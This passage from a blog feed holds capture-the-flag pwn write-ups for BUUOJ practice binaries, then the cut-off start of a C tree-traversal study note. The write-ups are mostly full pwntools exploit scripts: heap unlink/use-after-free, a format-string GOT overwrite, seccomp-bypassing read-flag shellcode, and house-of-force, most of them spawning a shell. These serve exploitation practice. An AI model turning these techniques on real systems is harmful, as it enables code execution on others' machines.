wdb_2018_1st_babyheap(unlink,uaf)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26136</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./wdb_2018_1st_babyheap&quot;)</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(r, </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x400CF7</span></span><br><span class="line"><span class="string">x/10gx 0x602060</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./wdb_2018_1st_babyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget_16 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">bss_arr = <span class="number">0x602060</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;Choice:&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, content</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">r.recvuntil(menu)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, (p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">0</span>, p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(heap) + p64(bss_arr-<span class="number">0x10</span>))</span><br><span class="line">payload = p64(bss_arr-<span class="number">0x18</span>) + p64(bss_arr-<span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br><span class="line">add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(bss_arr-<span class="number">0x18</span>) + p64(bss_arr-<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">malloc_hook = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc;&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook))</span><br><span class="line">edit(<span class="number">0</span>, p64(system)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="axb_2019_fmt6464位格式化字符串改got表"><a class="markdownIt-Anchor" href="#axb_2019_fmt6464位格式化字符串改got表">#</a> axb_2019_fmt64（64 位格式化字符串改 got 表）</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;,29964)</span></span><br><span class="line">io = process(<span class="string">&#x27;axb_2019_fmt64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./axb_2019_fmt64&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">sprintf_got = elf.got[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$saaaa&#x27;</span></span><br><span class="line">payload += p64(sprintf_got)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">sprintf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sprintf_addr:&quot;</span>+<span class="built_in">hex</span>(sprintf_addr)</span><br><span class="line"></span><br><span class="line">libcbase = sprintf_addr - libc.symbols[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line">one_gadget = libcbase + one_gadget[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget % <span class="number">0x10000</span>) - <span class="number">9</span>) + <span class="string">&#x27;c%12$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) % <span class="number">0x10000</span>) - (one_gadget % <span class="number">0x10000</span>)) + <span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(sprintf_got) + p64(sprintf_got + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;payload:&#x27;</span>+payload</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnable_asm沙箱"><a class="markdownIt-Anchor" href="#pwnable_asm沙箱">#</a> pwnable_asm（沙箱)</h1><h2 id="sandbox概述"><a class="markdownIt-Anchor" href="#sandbox概述">#</a> sandbox 概述</h2><p>沙盒机制也就是我们常说的沙箱，英文名 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。<br>  在 ctf 比赛中，pwn 题中的沙盒一般都会限制 execve 的系统调用，这样一来 one_gadget 和 system 调用都不好使，只能采取 open/read/write 的组合方式来读取 flag。<br>一般有两种函数调用方式实现沙盒机制，第一种是采用 prctl 函数调用，第二种是使用 seccomp 库函数。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202172127384.png" alt="image-20220217212749222"></p><p>使用 seccomp-tools 检查沙盒机制，可以看到先是判断了体系架构是否是 x86_64 的，然后对系统调用号进行了判断，只允许了 read/write/open/exit 四种系统调用。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202172139478.png" alt="image-20220217213945397"></p><h2 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="string">&quot;26693&quot;</span>)</span><br><span class="line"><span class="comment"># sh = process(&#x27;./asm&#x27;)</span></span><br><span class="line">shellcode = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;shellcode: &quot;</span>, asm(shellcode))</span><br><span class="line"><span class="built_in">print</span> sh.recvall()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/A951860555/article/details/116738676">https://blog.csdn.net/A951860555/article/details/116738676</a></p><h1 id="bctf2016_bcloudhouse-of-force"><a class="markdownIt-Anchor" href="#bctf2016_bcloudhouse-of-force">#</a> bctf2016_bcloud(house of force)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#house of  force</span></span><br><span class="line">sh = process(<span class="string">&#x27;./bcloud&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;node4.buuoj.cn&#x27;,28752)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bcloud&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">heap_array_addr = <span class="number">0x0804B120</span></span><br><span class="line">sh.sendafter(<span class="string">&#x27;Input your name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_addr=&#x27;</span>,<span class="built_in">hex</span>(heap_addr)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Org:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#修改top chunk的size</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Host:&#x27;</span>,p32(<span class="number">0xFFFFFFFF</span>))</span><br><span class="line">top_chunk_addr = heap_addr + <span class="number">0xD0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;top_chunk_addr=&#x27;</span>,<span class="built_in">hex</span>(top_chunk_addr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the length of the note content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">offset = heap_array_addr - top_chunk_addr - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">&#x27;&#x27;</span>) <span class="comment">#0</span></span><br><span class="line"><span class="comment">#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#修改heap_array</span></span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露puts的地址</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.recv(<span class="number">1</span>)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改free的got表为system地址</span></span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/seaaseesa/article/details/105588058?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_default&amp;utm_relevant_index=3">参考文章</a></p><p><a href="https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud">https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud</a></p><p><a href="https://blog.csdn.net/csdn546229768/article/details/122725993">https://blog.csdn.net/csdn546229768/article/details/122725993</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构基础代码总结（树和图）</title>
      <link href="/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/"/>
      <url>/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>树和图部分</p><span id="more"></span><h1 id="一-树和二叉树"><a class="markdownIt-Anchor" href="#一-树和二叉树">#</a> 一、树和二叉树</h1><h2 id="树的遍历"><a class="markdownIt-Anchor" href="#树的遍历">#</a> 树的遍历</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>, *<span class="title">rchild</span>;</span></span><br><span class="line">&#125; BiTNode, *BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">visit(T);</span><br><span class="line">PreOrder(T-&gt;lchild);</span><br><span class="line">PreOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder2</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line">InitStack(S);</span><br><span class="line">BiTree p = T;</span><br><span class="line"><span class="keyword">while</span> (p || !IsEmpty(S)) &#123;</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">visit(p);</span><br><span class="line">Push(S, p);</span><br><span class="line">p = p-&gt;lchild;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Pop(S, p);</span><br><span class="line">p = p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">InOrder(T-&gt;lchild);</span><br><span class="line">visite(T);</span><br><span class="line">InOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder2</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line">InitStack(S);</span><br><span class="line">BiTree p = T;</span><br><span class="line"><span class="keyword">while</span> (p || !IsImpty(S)) &#123;</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">push(S, p);</span><br><span class="line">p = p-&gt;lchild;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Pop(S, p);</span><br><span class="line">visit(p);</span><br><span class="line">p = p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">PostOrder(T-&gt;lchild);</span><br><span class="line">PostOrder(T-&gt;rchild);</span><br><span class="line">visit(T);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//层次遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span> 